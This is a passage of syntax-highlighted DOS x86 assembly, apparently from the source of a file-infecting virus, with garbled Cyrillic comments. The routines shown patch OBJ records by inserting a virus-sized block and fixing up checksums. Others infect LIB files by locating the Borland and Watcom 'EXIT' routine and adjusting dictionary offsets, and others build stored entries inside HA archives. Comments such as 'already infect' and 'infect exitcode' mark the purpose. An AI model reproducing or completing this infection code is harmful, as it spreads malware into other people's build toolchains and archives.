        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LEDATA</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc5">DO</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">LU</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc1">;\--------------------------/</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc0"> </span><span class="sc1">;    jb      @repeat</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">)+</span><span class="sc2">3E7h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">   </span><span class="sc1">;razmer wtorogo finserta</span><span class="sc0">

</span><span class="sc1">;seek_pos(posA0)????</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">posA0.lo</span><span class="sc4">]</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">posA0.hi</span><span class="sc4">]</span><span class="sc0">
     </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosseek</span><span class="sc0">
</span><span class="sc1">;write (heap, [objhdr.recsize]+3)</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">objhdr.recsize</span><span class="sc4">]</span><span class="sc0">
     </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
     </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">doswrite_from_heap</span><span class="sc0">
</span><span class="sc1">;f_insert (heap+[objhdr.recsize], 3E7h-([objhdr.recsize]+3))</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
     </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3E7h</span><span class="sc0">
     </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
     </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">lib_dict_offset</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc1">;     adc     [lib_dict_offset.hi], 0</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dostell</span><span class="sc0">
     </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
     </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">f_insert</span><span class="sc0">
</span><span class="sc1">;read (objhdr, 22h)</span><span class="sc0">
</span><span class="sc1">;---- skip FIXUPP if present</span><span class="sc0">
     </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_buf_22</span><span class="sc0">
     </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">objhdr.rectype</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">FIXUPP</span><span class="sc0">
     </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">objhdr.recsize</span><span class="sc4">]</span><span class="sc0">
     </span><span class="sc5">DONE</span><span class="sc0">
     </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosseek_cur_neg_ax</span><span class="sc0">
</span><span class="sc1">;f_insert (heap+3E7h, virrsize-3E7h)</span><span class="sc0">
     </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">heap</span><span class="sc4">+</span><span class="sc2">3E7h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">  </span><span class="sc1">;virrsize-3E7h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">f_insert</span><span class="sc0">
</span><span class="sc1">;-process-segment------------</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">pos98.lo</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">pos98.hi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosseek</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_buf_22</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosseek_cur_neg_ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fisize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">shift_buffer.segsize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">;/----crc-------------------\
    mov     cx, [objhdr.recsize]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vir_heap._objhdr</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">LU</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc1">;\--------------------------/</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DosWrite_shbuf_22</span><span class="sc0">


</span><span class="sc1">;ÄÅÄÄ[process LIB]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">process_lib</span><span class="sc0">
</span><span class="sc1">;CALL CHECK_PROCESS_NAME</span><span class="sc0">
</span><span class="sc1">; âª § à ¦¥­¨¥ LIB § ­¨¬ ¥â ¬­®£® ¢à¥¬¥­¨</span><span class="sc0">
</span><span class="sc1">; íâ® áâ®¨â ¤¥« âì ¯à¨ à ¡®â¥ NDD, PKLITE, TLINK, etc</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">libhdr.lib_hdr_dict_offs</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">lib$ret</span><span class="sc0"> </span><span class="sc1">;already infect</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">                                      </span><span class="sc1">;infect exitcode of 'C' program</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                       </span><span class="sc1">;search for 'EXIT'</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vir_heap._libhdr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">calculate_crc</span><span class="sc0">    </span><span class="sc1">;&lt;add si,3</span><span class="sc0">
</span><span class="sc1">;; § à ¦¥­¨¥ '___write', '__ioalloc_' ¨â¯</span><span class="sc0">
        </span><span class="sc5">cmp_ax_CRC32w</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'E'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'X'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'I'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'T'</span><span class="sc4">&gt;</span><span class="sc0">      </span><span class="sc1">;&lt; BORLAND</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exfound</span><span class="sc0">
        </span><span class="sc5">cmp_ax_CRC32w</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'e'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'x'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'i'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'t'</span><span class="sc4">&gt;</span><span class="sc0">      </span><span class="sc1">;&lt; WATCOM</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exfound</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">-</span><span class="sc5">HDRBUFSIZE</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosseek_cur_cx_1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">virobjblk</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_buf_22</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HDRBUFSIZE</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">
</span><span class="sc5">end_process_dictionary</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">lib$ret</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">exfound</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">libhdr</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">32h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">lib$ret</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">process_obj</span><span class="sc0"> </span><span class="sc1">;hmmm...</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">lib$ret</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosseek_bof</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_buf_22</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lib_dict_offset</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">libhdr.lib_hdr_dict_offs.lo</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">libhdr.lib_hdr_dict_offs.hi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_exehdr</span><span class="sc0">
</span><span class="sc1">;    call    dosseek_bof</span><span class="sc0">
</span><span class="sc1">;    call    doswrite_shbuf_22</span><span class="sc0">
</span><span class="sc1">;¢ á«®¢ à¥:  ¤«ï ¢á¥å § ¯¨á¥© &gt; exit_ ¤®¡ ¢¨âì à §¬¥à ¢áâ ¢ª¨ ¢ ¯ à £à ä å</span><span class="sc0">
</span><span class="sc1">;seek (lib_hdr_dict_offs)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">libhdr.lib_hdr_dict_offs.hi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">libhdr.lib_hdr_dict_offs.lo</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosseek</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LIB_DICTIONARY_ENTRY_SIZE</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosread</span><span class="sc0">                 </span><span class="sc1">; read (heap, 0x200)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LIB_DICTIONARY_ENTRY_SIZE</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                  </span><span class="sc1">; ¯®â®¬ á¤¥« © ç¥à¥§ SAHF</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">end_process_dictionary</span><span class="sc0">  </span><span class="sc1">;&lt; ¯®á«¥ íâ®£® ­ ¤®-¡ë</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosseek_cur_neg_dx</span><span class="sc0">      </span><span class="sc1">; áâàã­ª¥©â¨âì extended dictionary.</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; process:)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">
        </span><span class="sc5">DO</span><span class="sc0">
            </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">   </span><span class="sc1">;ch=0</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">   </span><span class="sc1">;ch=0</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">UNINIT</span><span class="sc0">
</span><span class="sc5">virobjblk</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">A</span><span class="sc0">
                    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lib_dict_offset</span><span class="sc4">]</span><span class="sc0">
                    </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc5">DONE</span><span class="sc0">
            </span><span class="sc5">DONE</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">LU</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LIB_DICTIONARY_ENTRY_SIZE</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">doswrite_from_heap</span><span class="sc0">      </span><span class="sc1">; write (heap, 0x200)</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc1">;ÄÅÄÄ[process HA]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">process_ha</span><span class="sc0">
</span><span class="sc1">;int 2bh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hahdr.filecnt</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">hafcount</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HDRBUFSIZE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">ha_main</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosseek_cur_neg_ax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">sss</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">cycle8</span><span class="sc0">
</span><span class="sc1">;seek(size ha_file_hdr)+size name+machine+1</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vir_heap._hahdr.ha_name</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc0"> </span><span class="sc1">; max length name</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">LUNZ</span><span class="sc0">
    </span><span class="sc6">jcxz</span><span class="sc0">    </span><span class="sc5">error_exit2</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">34h</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                            </span><span class="sc1">;&lt;cx=0</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hahdr.ha_compress_size.lo</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hahdr.ha_compress_size.hi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosseek_cur</span><span class="sc0">
</span><span class="sc5">sss</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;read(header)</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_buf_22</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">hahdr.ha_ver_method</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">HA_METHOD_STORED</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">error_exit2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HDRBUFSIZE</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">cycle8</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">error_exit2</span><span class="sc0">
</span><span class="sc1">;/+- CREATE HAHDR -+-</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vir_heap._crthdr</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">sto_byte</span><span class="sc0">  </span><span class="sc5">HA_METHOD_STORED</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_fisize</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vir_heap._arx_crc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">movs4</span><span class="sc0">                   </span><span class="sc1">;d;file crc_32</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_dtim1</span><span class="sc0">
    </span><span class="sc5">sto_byte</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;    sto_word '/'</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_fname</span><span class="sc0">
    </span><span class="sc5">sto_two_byte</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc5">sto_two_byte</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc1">;\+- CREATE HAHDR -+-</span><span class="sc0">
